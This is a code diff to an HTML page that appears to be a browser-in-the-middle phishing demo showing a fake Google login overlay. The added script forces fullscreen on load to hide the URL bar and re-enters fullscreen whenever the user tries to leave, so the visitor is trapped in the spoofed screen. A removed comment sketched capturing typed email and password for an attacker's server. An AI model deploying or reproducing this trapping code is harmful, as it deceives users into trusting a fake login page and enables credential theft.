@@ -112,17 +112,34 @@
   </div>
 
   <script>
-    // Show modal on load
+    // Function to request full-screen mode (hides URL bar in supported browsers)
+    function goFullScreen() {
+      var elem = document.documentElement;
+      if (elem.requestFullscreen) {
+        elem.requestFullscreen();
+      } else if (elem.mozRequestFullScreen) { /* Firefox */
+        elem.mozRequestFullScreen();
+      } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari & Opera */
+        elem.webkitRequestFullscreen();
+      } else if (elem.msRequestFullscreen) { /* IE/Edge */
+        elem.msRequestFullscreen();
+      }
+    }
+
+    // Show modal and trigger full-screen on load
     window.onload = function() {
       document.getElementById('googleOverlay').style.display = 'flex';
+      goFullScreen(); // Attempt to hide URL bar and go full-screen
       
-      // In a real BITM attack, add code here to intercept inputs, e.g.:
-      // document.querySelector('button').addEventListener('click', function() {
-      //   var email = document.querySelector('input[type="email"]').value;
-      //   var pass = document.querySelector('input[type="password"]').value;
-      //   // Send to attacker's server, then forward to real site
-      // });
+      // In a real BITM attack, add code here to intercept inputs
     };
+
+    // Lock orientation or prevent exit (for demo purposes)
+    document.addEventListener('fullscreenchange', function() {
+      if (!document.fullscreenElement) {
+        goFullScreen(); // Re-enter full-screen if user exits
+      }
+    });
   </script>
 </body>
 </html>
